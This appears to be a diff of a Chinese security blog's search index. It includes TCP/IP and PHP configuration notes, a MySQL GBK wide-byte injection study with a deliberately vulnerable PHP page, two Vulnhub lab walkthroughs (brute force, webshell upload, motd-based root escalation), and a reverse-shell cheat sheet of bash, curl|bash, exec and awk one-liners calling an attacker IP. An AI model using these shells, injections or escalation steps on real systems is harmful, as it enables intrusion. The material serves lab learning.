+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysqli_set_charset(<span class="variable">$conn</span>, <span class="string">&#x27;gbk&#x27;</span>);</span><br><span class="line"><span class="variable">$name</span> = mysqli_real_escape_string(<span class="variable">$conn</span>, <span class="variable">$name</span>);</span><br></pre></td></tr></table></figure></li>
+<li><p>通过设置 character_set_client = binary改变字符集编码，连接时不使用GBK编码，从而无法绕过\。</p>
+<pre><code>我试了一下发现单单使用character_set_client = binary，无法防御注入同时查询当前的数据库编码也没有任何的改变，至少要使用 set_client 与 set_connection 两项才可以保护。具体原理以后再说吧,
+</code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;SET character_set_connection=gbk, ,character_set_client=binary</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>在最后我发现只要使用<code>mysqli_query($conn, &quot;SET character_set_connection=gbk, character_set_client=gbk&quot;);</code>就会导致宽字节注入，具体的原理还是等弄懂[[msyql数据编码]]以后在说。</p>
+]]></content>
+      <categories>
+        <category>注入</category>
+      </categories>
+      <tags>
+        <tag>宽字节注入</tag>
+        <tag>mysql</tag>
+        <tag>编码</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>反弹SHELL</title>
+    <url>/2021/12/14/%E5%8F%8D%E5%BC%B9SHELL/</url>
+    <content><![CDATA[<p>文章参考 : <a href="https://blog.csdn.net/Aaron_Miller/article/details/106825087">反弹Shell的方式和详解</a>  </p>
+<span id="more"></span>
+
+<h2 id="1-Linux反弹SHELL"><a href="#1-Linux反弹SHELL" class="headerlink" title="1.Linux反弹SHELL"></a>1.Linux反弹SHELL</h2><h3 id="1-1BASH反弹SHELL"><a href="#1-1BASH反弹SHELL" class="headerlink" title="1.1BASH反弹SHELL"></a>1.1BASH反弹SHELL</h3><p>攻击方:10.1.1.130<br>靶机:10.1.1.131</p>
+<p>攻击方使用nc监听端口<br><code> nc -lvp 9876</code><br>靶机执行命令<br><code> bash -i &gt;&amp; /dev/tcp/10.1.1.130/9876 0&gt;&amp;1</code></p>
+<ul>
+<li>bash -i 表示创建一个新的shell页面</li>
+<li>&gt;&amp;表示将标准输出和错误输出都重定向到文件</li>
+<li>/dev/tcp/10.1.1.130/9876 表示对10.1.1.130 9876端口建立连接</li>
+<li>0&gt;&amp;1表示将标准输入 作为标准输出</li>
+</ul>
+<h3 id="1-2-CURL反弹SHELL"><a href="#1-2-CURL反弹SHELL" class="headerlink" title="1.2 CURL反弹SHELL"></a>1.2 CURL反弹SHELL</h3><p>攻击方存在web服务，并建立一个文件中存放任意反弹SHELL命令。控制靶机CRUL web中的反弹shell文件，通过管道符作为bash输入，实现反弹SEHLL。    </p>
+<p>攻击方 :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &amp;&gt; /dev/tcp/10.1.1.130/9876 0&gt;&amp;1&quot;</span> &gt; index.html</span><br><span class="line">nc -lvp 9876</span><br></pre></td></tr></table></figure>
+<p>靶机:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl 10.1.1.130 | bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-EXEC反弹SHELL"><a href="#1-3-EXEC反弹SHELL" class="headerlink" title="1.3 EXEC反弹SHELL"></a>1.3 EXEC反弹SHELL</h3><p>靶机:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/10.1.1.130/9876;cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-AWK反弹SHELL"><a href="#1-4-AWK反弹SHELL" class="headerlink" title="1.4 AWK反弹SHELL"></a>1.4 AWK反弹SHELL</h3><p>靶机:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;s = &quot;/inet/tcp/0/10.1.1.130/9876&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&#x27;</span> /dev/null</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>反弹shell</category>
+      </categories>
+      <tags>
+        <tag>shell</tag>
       </tags>
   </entry>
   <entry>
@@ -724,308 +1026,6 @@
       <tags>
         <tag>PHP</tag>
         <tag>JS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Tcp_ip协议 12.2TCP的引入</title>
-    <url>/2021/09/03/Tcp_ip%E5%8D%8F%E8%AE%AE%2012.2TCP%E7%9A%84%E5%BC%95%E5%85%A5/</url>
-    <content><![CDATA[<p>12.2 TCP的引入</p>
-<span id="more"></span>
-
-<p>2021年9月3日</p>
-<p>21:05</p>
-<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210903213842.png" alt="TCP头部在数据包中封装"></p>
-<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210903213934.png" alt="TCP头部信息"></p>
-<ul>
-<li>TCP头部包含源端口和目标端口。端口和IP唯一标识了每个TCP连接，端口IP的组合有时被称为socket。   4字节</li>
-<li>序列号标记了这一段信息中第一个字节的编号 4字节</li>
-<li>ACK(确认号)为最后接收到的字节的序列号+1.  4字节</li>
-<li>头部长度以32位字(4字节)为单位确定4位标识位，TCP头部最多带60字节头部.   头部长度加上保留 共 1字节</li>
-<li>8种状态位     1字节</li>
-<li>窗口大小      2字节</li>
-<li>TCP校验      2字节</li>
-<li>紧急指针      2字节 //仅在URG字段设置时有效</li>
-</ul>
-<ol>
-<li>SYN状态位，在建立连接时使用</li>
-<li>FIN状态位, 当关闭连接时使用</li>
-</ol>
-]]></content>
-      <categories>
-        <category>网络</category>
-      </categories>
-      <tags>
-        <tag>网络</tag>
-        <tag>tcp/ip</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP核心配置</title>
-    <url>/2021/09/04/PHP%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<p>PHP核心配置</p>
-<span id="more"></span>
-
-<p>2021年7月13日</p>
-<p>10:58</p>
-<ul>
-<li>配置的可修改范围</li>
-</ul>
-<p>PHP_INI_USER        可在用户脚本（例如 ini_set()）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定 </p>
-<p>PHP_INI_PERDIR        可在 php.ini，.htaccess 或 httpd.conf 中设定</p>
-<p>PHP_INI_SYSTEM        可在 php.ini 或 httpd.conf 中设定</p>
-<p>PHP_INI_ALL        可在任何地方设定</p>
-<p>php.ini only    仅在php.ini中设置</p>
-<ul>
-<li>核心配置选项<ul>
-<li>register_globals</li>
-</ul>
-</li>
-</ul>
-<p>说明:该选项在on情况下，会将用户GET,POST提交上的参数自动注册为全局变量，并且初始化为对应的值。</p>
-<p>版本变换:PHP &lt;= 4.2.3范围为PHP_INI_ALL, 在PHP5.3.0开始默认关闭 ， PHP 5.4.0移除该选项。</p>
-<p>例子:</p>
-<?php
-
-if($user=admin)
-
-echo 123;
-
-?>
-
-<p>xx.php?user=admin运行时会输出123</p>
-<ul>
-<li>allow_url_include</li>
-</ul>
-<p>说明:开启情况下，运行包含远程文件.</p>
-<p>版本变化: PHP 5.2.0后默认关闭</p>
-<ul>
-<li>magic_quotes_gpc</li>
-</ul>
-<p>说明:开启后会在GET , POST, COOKIE 变量中 ‘ “  \ null 字符前加入,但是并不会过滤$_SERVER变量。</p>
-<p>版本变化:PHP 5.3后默认关闭 , 5.4之后取消 ， 在&lt;=4.2.3时,配置范围为 PHP_INI_ALL</p>
-<ul>
-<li>magic_quotes_runtime</li>
-</ul>
-<p>说明:与_gpc相同，只不过只对文件和数据库中获取的数据转义。</p>
-<p>版本变化:5.4后取消</p>
-<p>特点:只有部分函数受影响</p>
-<ul>
-<li>magic_quotes_sybase</li>
-</ul>
-<p>说明:会将GET,POST, Cookie的传递的单引号(‘)变为(“)，并转义null字符.</p>
-<p>配置范围: PHP_INI_ALL</p>
-<p>版本: 5.4.0后移除</p>
-<p>特点:当开启后会覆盖_gpc = on;</p>
-<ul>
-<li>safe_mode(安全模式)</li>
-</ul>
-<p>配置范围:PHP_INI_SYSTEM</p>
-<p>版本: 5.4.0之后被取消</p>
-<p>说明:</p>
-<ul>
-<li><p>所有文件操作会受限制</p>
-</li>
-<li><p>popen(), system(), exec()等命令执行函数会受限制</p>
-</li>
-<li><p>open_basedir</p>
-</li>
-</ul>
-<p>说明:限制PHP可以访问的目录</p>
-<p>配置范围:&lt;2.2.3 PHP_INI_SYSTEM ，  &gt;= 5.2.3 PHP_INI_ALL</p>
-<p>特点:对于目录要以/闭合，如 open_basedir = www/a,那么可以访问www/a 和www/b。</p>
-<p>因此合理的写法为www/a/</p>
-<ul>
-<li>diable_functions</li>
-</ul>
-<p>说明:禁止php函数应用</p>
-<p>范围:php.ini</p>
-<ul>
-<li>display_errors  , error_reporting</li>
-</ul>
-<p>说明:关闭 _errors关闭会取消错误显示，当开启时配合_reporting可以控制错误显示级别.</p>
-<p>配置范围:PHP_INI_ALL</p>
-]]></content>
-      <categories>
-        <category>代码审计</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Tcp_ip协议 13.2连接的建立和终止</title>
-    <url>/2021/09/06/Tcp_ip%E5%8D%8F%E8%AE%AE%2013.2%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%BB%BA%E7%AB%8B%E5%92%8C%E7%BB%88%E6%AD%A2/</url>
-    <content><![CDATA[<h1 id="13-2-TCP-IP连接的建立和终止"><a href="#13-2-TCP-IP连接的建立和终止" class="headerlink" title="13.2 TCP_IP连接的建立和终止"></a>13.2 TCP_IP连接的建立和终止</h1><span id="more"></span>
-
-<h2 id="连接建立"><a href="#连接建立" class="headerlink" title="连接建立"></a>连接建立</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210906220930.png" alt="建立连接"></p>
-<ol>
-<li>主动开启者发送报文，包含初始序列号ISN_c,SYN位表示想要建立TCP连接</li>
-<li>服务器SYN报文seq = $INS_x$, ACK=$INS_c$+1，表示服务器确认建立连接。此时<strong>服务器</strong>知道<strong>服务器接受</strong>功能无问题、<strong>客户端发送</strong>无问题</li>
-<li>客户端发送ACK报文，seq = $INS_c+1$, ACK = $INS_x+1$。当客户端接受到2号报文时，<strong>客户端</strong>确认<strong>双方发送接受</strong>均无问题。当<strong>服务端</strong>接受到报文3时确认<strong>服务端发送客户端接受</strong>无问题。</li>
-</ol>
-<h2 id="连接关闭"><a href="#连接关闭" class="headerlink" title="连接关闭"></a>连接关闭</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210906221028.png" alt="连接关闭"></p>
-<ol>
-<li>主动开启者发送    Fin段以及$Seq = k, ACK = L$。表示想要关闭连接。</li>
-<li>被动开启者发送 $Seq = L, ACK = k+1$，表示接收到关闭帧。</li>
-<li>如果有数据还需要发送，进行剩余的数据发送</li>
-<li>被动开启者发送$Fin Seq = L , ACK = k+1$，表示关闭连接。</li>
-<li>主动开启者发送$Seq = k+1，  ACK = L+1 $，接收到被动方的连接关闭。</li>
-</ol>
-<h2 id="TCP半关闭"><a href="#TCP半关闭" class="headerlink" title="TCP半关闭"></a>TCP半关闭</h2><p>含义：半关闭表示为一方发送Fin连接表示我已经发送了所有我应该发送的数据，但是我仍然希望接收对方发送的数据直到对方发送Fin连接。表示对方数据同样发送完毕。</p>
-<p>整体流程与TCP关闭相同不过在第三步会发送更多的数据。</p>
-<h2 id="同时打开与同时关闭"><a href="#同时打开与同时关闭" class="headerlink" title="同时打开与同时关闭"></a>同时打开与同时关闭</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210906221113.png"></p>
-<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210906221145.png"></p>
-<p>当双方同时向对方发送清求连接或者请求关闭连接时，会发生这种情况。此时无论建立连接或者关闭连接都会发送4个报文。</p>
-<h2 id="连接建立超时"><a href="#连接建立超时" class="headerlink" title="连接建立超时"></a>连接建立超时</h2><p>当向无法回复的服务器请求建立连接时，客户端会不断向服务器发送SYN报文。时间上采取<strong>指数回退</strong>。第二次发送报文3秒后，第三次在上一个报文发送6秒后，第四次在上一次发送12秒后。以此类推，同时可以控制尝试发送SYN连接报文的最多次数。</p>
-]]></content>
-      <categories>
-        <category>网络</category>
-      </categories>
-      <tags>
-        <tag>网络</tag>
-        <tag>tcp/ip</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>msyql宽字节注入</title>
-    <url>/2021/09/16/msyql%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="mysql宽字节注入"><a href="#mysql宽字节注入" class="headerlink" title="mysql宽字节注入"></a>mysql宽字节注入</h1><span id="more"></span>
-
-<p>  #宽字节注入</p>
-<p>  在注入过程中，如果采用magic_quot_gpc 或者 addslashes()。如果采用’注入会产生&#39;。导致无法绕过’’。当采用客户端采用 SET names = GBK 或者 mysqli_set_charset($conn, ‘gbk’)时，相当于设置 </p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary</span><br></pre></td></tr></table></figure>
-
-<p>此时转义字符\被URL编码解析为 %5c 如果我们手动输入 %df’。经过浏览器编码和转义后会成为 %df%5c%27。在[[msyql数据编码]]的设置下,%df%5c 连接在一起会被解析为GBK双字节编码,此时%df\会变为一个汉字。因此我们便绕过了\转义符,实现了在mysql语句中直接插入’的目的。在绕过的过程中%df不固定，只要可以与%5c一起构成GBK编码都可以绕过\转义符。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//echo 12341234;</span><br><span class="line"></span><br><span class="line">	function unicode($res)</span><br><span class="line">	&#123;</span><br><span class="line">		//echo 1234;</span><br><span class="line">		 //print&quot;12421&quot;;</span><br><span class="line">			 while($val=mysqli_fetch_row($res))&#123;</span><br><span class="line">   			 print&quot;&#123;$val[0]&#125; = &#123;$val[1]&#125;&quot;;</span><br><span class="line">   			  print(&quot;&lt;br&gt;&quot;);</span><br><span class="line">			 &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//echo 1234555;</span><br><span class="line">	header(&quot;Content-Type:text/html;charset=gbk&quot;); //为了显示，将页面默认为gbk</span><br><span class="line">	$name=$_GET[&#x27;name&#x27;];</span><br><span class="line">		echo $name;</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	$conn = mysqli_connect(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;root&#x27;);  </span><br><span class="line">	mysqli_select_db($conn,&#x27;xnfh&#x27;);</span><br><span class="line">	</span><br><span class="line">	print&quot;****************&lt;br&gt;AT Start &lt;br&gt;&quot;;</span><br><span class="line">	</span><br><span class="line">	$result=mysqli_query($conn,&quot;show variables like &#x27;character\_set\_%&#x27;;&quot;);</span><br><span class="line">	unicode($result);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	//mysqli_set_charset($conn, &#x27;gbk&#x27;);</span><br><span class="line">	//mysqli_query($conn,&quot;set names &#x27;gbk&#x27;&quot;);</span><br><span class="line">	mysqli_query($conn, &quot;SET character_set_connection=gbk, character_set_client=gbk&quot;);</span><br><span class="line">	print&quot;*********************** &lt;br&gt;charset gbk &lt;br&gt;&quot;;</span><br><span class="line">		$result=mysqli_query($conn,&quot;show variables like &#x27;character\_set\_%&#x27;;&quot;);</span><br><span class="line">	unicode($result);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		mysqli_query($conn, &quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;);</span><br><span class="line">		print&quot;*********************** &lt;br&gt;charset gbk and protect &lt;br&gt;&quot;;</span><br><span class="line">		$result=mysqli_query($conn,&quot;show variables like &#x27;character\_set\_%&#x27;;&quot;);</span><br><span class="line">	unicode($result);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	//$name = mysqli_real_escape_string($conn, $name);</span><br><span class="line">	$name =addslashes($name);</span><br><span class="line">	//echo 1234;</span><br><span class="line">	//mysqli_query($conn,&quot;character_set_client=binary&quot;);</span><br><span class="line">	</span><br><span class="line">	//mysqli_query($conn,&quot;SET character_set_connection=gbk,character_set_client=binary&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	echo $name;</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	//mysqli_query($conn,&quot;SET NAMES &#x27;gbk&#x27;&quot;);</span><br><span class="line">	if($conn==null)&#123;exit(&quot;connect error !&lt;br&gt;&quot;);&#125;</span><br><span class="line">	$sql=&quot;select * from users where id=&#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">	$result2=mysqli_query($conn,$sql);</span><br><span class="line">	unicode($result2);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	echo $sql;</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	//echo 1234;</span><br><span class="line">	unicode($result);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>经过实验代码我们发现，直接设置 SET NAMES gbk 与  mysqli_set_charset 在直接结果上都是相同的 ,都只改变3项为gbk.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AT Start</span><br><span class="line"></span><br><span class="line">character_set_client = utf8</span><br><span class="line">character_set_connection = utf8</span><br><span class="line">character_set_database = utf8</span><br><span class="line">character_set_filesystem = binary</span><br><span class="line">character_set_results = utf8</span><br><span class="line">character_set_server = utf8</span><br><span class="line">character_set_system = utf8</span><br><span class="line">***********************</span><br><span class="line">After charset gbk</span><br><span class="line"></span><br><span class="line">character_set_client = gbk		//改变</span><br><span class="line">character_set_connection = gbk	//改变</span><br><span class="line">character_set_database = utf8</span><br><span class="line">character_set_filesystem = binary</span><br><span class="line">character_set_results = gbk	//改变</span><br><span class="line">character_set_server = utf8</span><br><span class="line">character_set_system = utf8</span><br></pre></td></tr></table></figure>
-
-<p>防御方法 </p>
-<ol>
-<li><p>通过mysqli_set_charset 与 mysql_real_escape_string()转义达到效果，放弃add….()函数。</p>
-<pre><code>通过mysqli_set_charse设置字符集之后，使用real_escape()函数会根据对应设置的字符集进行相应的转义，虽然字符集设计没有改变，但是无法绕过\转义符.
-</code></pre>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysqli_set_charset(<span class="variable">$conn</span>, <span class="string">&#x27;gbk&#x27;</span>);</span><br><span class="line"><span class="variable">$name</span> = mysqli_real_escape_string(<span class="variable">$conn</span>, <span class="variable">$name</span>);</span><br></pre></td></tr></table></figure></li>
-<li><p>通过设置 character_set_client = binary改变字符集编码，连接时不使用GBK编码，从而无法绕过\。</p>
-<pre><code>我试了一下发现单单使用character_set_client = binary，无法防御注入同时查询当前的数据库编码也没有任何的改变，至少要使用 set_client 与 set_connection 两项才可以保护。具体原理以后再说吧,
-</code></pre>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;SET character_set_connection=gbk, ,character_set_client=binary</span></span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<p>在最后我发现只要使用<code>mysqli_query($conn, &quot;SET character_set_connection=gbk, character_set_client=gbk&quot;);</code>就会导致宽字节注入，具体的原理还是等弄懂[[msyql数据编码]]以后在说。</p>
-]]></content>
-      <categories>
-        <category>注入</category>
-      </categories>
-      <tags>
-        <tag>宽字节注入</tag>
-        <tag>mysql</tag>
-        <tag>编码</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NARAK靶机</title>
-    <url>/2021/12/12/NARAK%E9%9D%B6%E6%9C%BA/</url>
-    <content><![CDATA[<h1 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h1><p>靶机地址：<a href="https://www.vulnhub.com/entry/ha-narak,569/">NARAK</a><br>目标:user.txt , root.txt</p>
-<span id="more"></span>
-
-
-<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><p>使用namp 扫描10.1.1.0/24网段，发现靶机地址为10.1.1.129。<br>开放22端口和80端口。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211212160132.png" alt="靶机扫描"><br>进入网页后发现，都是图片没有什么有用的信息。<br>使用dirb扫描靶机后发现存在三个目录<br><code>dirb http://10.1.1.129</code></p>
-<ul>
-<li>/index.html</li>
-<li>/server-startus</li>
-<li>/webdav</li>
-</ul>
-<p>index为主页，server-startus没有足够的权限，webdav需要帐号密码才能够查看。目前来看唯一可行的只有通过webdav进入。<br>使用cewl 对index网页进行爬虫，得到可能的密码字典，然后使用hydra进行爆破尝试.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl -w password.txt http://10.1.1.129</span><br><span class="line">hydra -L password.txt -P password.txt 10.1.1.129 http-get /webdav</span><br></pre></td></tr></table></figure>
-
-<p>得到 yamdoot:Swarg账户。尝试之后无法使用ssh登录。使用cadaver 连接webdav,然后put一个webshell进去。反弹shell后，使用<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>得到一个交互式bash窗口。  </p>
-<p>但是我们只有www-data权限，到home后我们得到了 inferno narak yamdoot 三个用户，试试用之前的密码连接全部失败了.又尝试进入mnt中发现有一个hell.sh文件，其中的内容为<br>    echo”Highway to Hell”;<br>    –[—–&gt;+&lt;]&gt;—.+++++.+.+++++++++++.–.+++[-&gt;+++&lt;]&gt;++.++++++.–[—&gt;+&lt;]&gt;–.—–.++++.</p>
-<p>其中的信息使用了brainfuck进行加密，到<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a> 进解码后，得到了 <strong>chitragupt</strong> 。<br>再次尝试使用三个帐号登录，这一次inferno帐号登录成功我们在home中得到了user.txt.很明显root.txt需要提权后得到。<br>使用motc提权</p>
-<ol>
-<li>进入文件夹 /etc/update-motd.d/</li>
-<li>修改文件 echo “echo ‘root:admin2’|sudo chpasswd” &gt;&gt; 00-header</li>
-<li>重新登录</li>
-<li>su root 密码为admin</li>
-</ol>
-<p>其中00-header文件的执行权限为root，但是我们可以对它进行修改意味着当文件执行时可以用root权限运行。00-header文件相当于登录的欢迎文件，当我们重新登录时 附加进的 echo ‘root:admin’|sudo chpasswd相当于使用root权限进行 chpasswd命令，而 | 前的相当于指令的输入，因此root的密码被修改为admin。从而获得root权限<br>在root文件夹中获得root.txt。</p>
-<hr>
-]]></content>
-      <categories>
-        <category>靶场</category>
-      </categories>
-      <tags>
-        <tag>靶场</tag>
-        <tag>Vulnhub</tag>
-        <tag>Linux提权</tag>
-        <tag>爬虫字典</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>lazysysadmin靶机</title>
-    <url>/2021/12/14/lazysysadmin%E9%9D%B6%E6%9C%BA/</url>
-    <content><![CDATA[<h2 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h2><p>下载地址:   <a href="https://www.vulnhub.com/entry/lazysysadmin-1,205/">LAZYSYSADMIN</a> </p>
-<span id="more"></span>
-
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>扫描网段，发现靶机ip地址，而且开放了 22  80 139 445 3306 6667 端口。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211214092751.png" alt="扫描结果">   </p>
-<p>首先查看445端口有那些共享文件。使用enum4linux扫描共享文件信息。  </p>
-<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211214093329.png" alt="扫描结果"></p>
-<p>通过扫描结果，可以使用空用户名和密码登录。共享文件信息有print$ , share$  , ipc$ .<br>通过\10.1.1.131\share$访问后。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211214093503.png" alt="共享文件内容"><br>打开deet.txt文件后，获得密码<strong>12345</strong>,同时访问wordpress配置文件获得了数据库用户名<strong>Admin</strong>,密码<strong>TogieMYSQL12345^^</strong><br>访问wordpress后在首页得到用户名<strong>togie</strong>，尝试通过wordpress对靶机进行渗透。  </p>
-<ol>
-<li>进入wordpress/wp-admin，尝试使用mysql帐号密码进入</li>
-<li>在Appearance中的editor修改404页面，写入shell<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211214100216.png" alt="修改404页面"></li>
-<li> 进入404页面 /wordpress/wp-content/themes/twentyfifteen/404.php，获得shell</li>
-</ol>
-<p>反弹shell后，进入home页面发现用户togie，使用share$中的密码12345登录成功。sudo -L查看权限，用户拥有all:all权限，使用sudo su获得root权限。</p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-      </categories>
-      <tags>
-        <tag>靶场</tag>
-        <tag>Vulnhub</tag>
-        <tag>wordpress</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>反弹SHELL</title>
-    <url>/2021/12/14/%E5%8F%8D%E5%BC%B9SHELL/</url>
-    <content><![CDATA[<p>文章参考 : <a href="https://blog.csdn.net/Aaron_Miller/article/details/106825087">反弹Shell的方式和详解</a>  </p>
-<span id="more"></span>
-
-<h2 id="1-Linux反弹SHELL"><a href="#1-Linux反弹SHELL" class="headerlink" title="1.Linux反弹SHELL"></a>1.Linux反弹SHELL</h2><h3 id="1-1BASH反弹SHELL"><a href="#1-1BASH反弹SHELL" class="headerlink" title="1.1BASH反弹SHELL"></a>1.1BASH反弹SHELL</h3><p>攻击方:10.1.1.130<br>靶机:10.1.1.131</p>
-<p>攻击方使用nc监听端口<br><code> nc -lvp 9876</code><br>靶机执行命令<br><code> bash -i &gt;&amp; /dev/tcp/10.1.1.130/9876 0&gt;&amp;1</code></p>
-<ul>
-<li>bash -i 表示创建一个新的shell页面</li>
-<li>&gt;&amp;表示将标准输出和错误输出都重定向到文件</li>
-<li>/dev/tcp/10.1.1.130/9876 表示对10.1.1.130 9876端口建立连接</li>
-<li>0&gt;&amp;1表示将标准输入 作为标准输出</li>
-</ul>
-<h3 id="1-2-CURL反弹SHELL"><a href="#1-2-CURL反弹SHELL" class="headerlink" title="1.2 CURL反弹SHELL"></a>1.2 CURL反弹SHELL</h3><p>攻击方存在web服务，并建立一个文件中存放任意反弹SHELL命令。控制靶机CRUL web中的反弹shell文件，通过管道符作为bash输入，实现反弹SEHLL。    </p>
-<p>攻击方 :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &amp;&gt; /dev/tcp/10.1.1.130/9876 0&gt;&amp;1&quot;</span> &gt; index.html</span><br><span class="line">nc -lvp 9876</span><br></pre></td></tr></table></figure>
-<p>靶机:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl 10.1.1.130 | bash</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-3-EXEC反弹SHELL"><a href="#1-3-EXEC反弹SHELL" class="headerlink" title="1.3 EXEC反弹SHELL"></a>1.3 EXEC反弹SHELL</h3><p>靶机:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/10.1.1.130/9876;cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="1-4-AWK反弹SHELL"><a href="#1-4-AWK反弹SHELL" class="headerlink" title="1.4 AWK反弹SHELL"></a>1.4 AWK反弹SHELL</h3><p>靶机:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;s = &quot;/inet/tcp/0/10.1.1.130/9876&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&#x27;</span> /dev/null</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>反弹shell</category>
-      </categories>
-      <tags>
-        <tag>shell</tag>
       </tags>
   </entry>
 </search>
